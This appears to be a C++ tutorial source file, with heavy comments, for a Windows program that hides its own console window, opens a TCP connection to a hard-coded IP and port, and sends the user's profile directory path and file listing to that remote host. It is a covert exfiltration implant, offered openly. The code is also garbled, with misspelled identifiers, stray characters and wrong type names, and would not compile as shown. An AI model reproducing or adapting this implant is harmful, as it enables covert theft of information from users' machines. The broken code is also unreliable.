#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the Ws2_32.lib library in order to use sockets */

/* now comes headers which provide utilities for our program: */


#include <iostream> //std I/O
#include <winsock2.h> //networking util
#include <stdio.h> //std i/O

#include <stdlib.h> //std i/O
#include <dirent.h> //dir util
#include <string> //string util


// Next, we write our first function that will be responsible for collecting the path of the current user's directory on the filesystem:

/* char* before a functions' name means it will return a pointer to a string */
char* userDirectory() 
{

char* pPath; //we define a variable fof type **pointer to char** and name it pPath;
pPath = getenv ("USERPROFILE"); /* we use the function getenv that is shipped with the previously  ncluded headers in order to know the user's directory location - in this case, it is kept in an environment variable of the Windows system called "userprofile" */
if (pPath!=NUll) //check if hte retrieved path is null
0{
return pPath; //return the dir path and exit the function
}0else {// if the path is empty which menas that it was not possible to retrieve the path
0
perror(""); //print the error and exit
}

}

int main ()
{
ShowWindow(GetConsoleWindow(), SW_HIDE); // do not show (hide) this program
WSDATA WSAData; // declaration of structure holidng info about windows socket impl
SOCKET server; //var used to store the connection of the socket type
SOCKADDR_IN addr; //var holding conn details of  SOCKADDR type

WSAStartup(MAKEWORD(2, 0), &WSAData); //init usage of the winsock lib for open network
server = socket(AF_INET, SOCK_STREAM, 0); //set up a TCP socket
addr.sin_addr.s_addr = inet_addr("172.16.160.10");
addr.sin_family = AF_INET; //set addr family to AF_INET (IPV4)
addr.sin_port = htons(5555); 
connect(server, (SOCKADDR *)&addr, sixeof(addr)); //connect to previously set uop target host/port

/* Now the socket and its outgoing network TCP connection are established; data can now be sent over TCP. In this case, the server variable holds the connection details, so further sending any data to this target will be done using the server variable.

Next, the directory reading will take place: */

char* pPath = userDirectory(); //new local var pPath is decleared and assigned to user dir
send(server, pPath, sizeof(pPath), 0); // the path is sent to the pentest on previously set ip address and port
DIR *dir; //new var named dir: Pointer to type DIR
struct dirent *ent; //new var named ent: point to structure
if((dir = opendir (pPath)) !=NULL){ //if opening dir at retrieved path brings any results
while ((ent = readdir (dir)) !=NUll){//loops over items within the dir as long as there are
send(server, ent->d_name, sizeof(ent->d_name), 0); //send name of current item

}
closedir (dir); //close the dir

}else {

perror(""); //if there was an error opening hte dir, print error

}
closesocket(server); //close hte socket
WSACleanup(); //clean up the Winsock lib components

}
















